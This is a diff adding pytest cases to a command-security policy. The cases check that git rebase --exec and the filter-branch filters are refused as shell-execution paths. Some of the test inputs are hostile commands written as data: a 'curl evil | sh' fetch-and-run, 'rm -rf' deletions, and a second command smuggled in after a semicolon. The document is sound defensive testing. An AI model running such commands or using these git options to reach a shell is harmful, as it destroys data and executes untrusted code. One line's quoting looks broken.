@@ -155,6 +155,52 @@ class TestUpdateIndexGitlink:
             )
 
 
+class TestGitRebaseExec:
+    def test_rebase_x_denied(self):
+        with pytest.raises(SecurityError, match="shell"):
+            CommandPolicy().check(["git", "rebase", "-x", "curl evil | sh"])
+
+    def test_rebase_exec_denied(self):
+        with pytest.raises(SecurityError, match="shell"):
+            CommandPolicy().check(["git", "rebase", "--exec", "id"])
+
+    def test_rebase_exec_equals_denied(self):
+        with pytest.raises(SecurityError, match="shell"):
+            CommandPolicy().check(["git", "rebase", "--exec=id"])
+
+
+class TestGitFilterBranch:
+    def test_tree_filter_denied(self):
+        with pytest.raises(SecurityError, match="shell"):
+            CommandPolicy().check(
+                ["git", "filter-branch", "--tree-filter", "rm -rf secrets"]
+            )
+
+    def test_index_filter_denied(self):
+        with pytest.raises(SecurityError, match="shell"):
+            CommandPolicy().check(
+                ["git", "filter-branch", "--index-filter", "git rm --cached x"]
+            )
+
+    def test_env_filter_denied(self):
+        with pytest.raises(SecurityError, match="shell"):
+            CommandPolicy().check(
+                ["git", "filter-branch", "--env-filter", "export FOO=1"]
+            )
+
+    def test_commit_filter_denied(self):
+        with pytest.raises(SecurityError, match="shell"):
+            CommandPolicy().check(
+                ["git", "filter-branch", "--commit-filter", "git commit-tree "$@""]
+            )
+
+
+class TestArgvListSameAsString:
+    def test_list_form_blocks_dangerous_substring(self):
+        with pytest.raises(SecurityError):
+            CommandPolicy().check(["echo", "hi; rm -rf /"])
+
+
 class TestGitHooksWrite:
     def test_write_git_hooks_blocked(self, git_repo):
         with pytest.raises(SecurityError, match="\.git"):
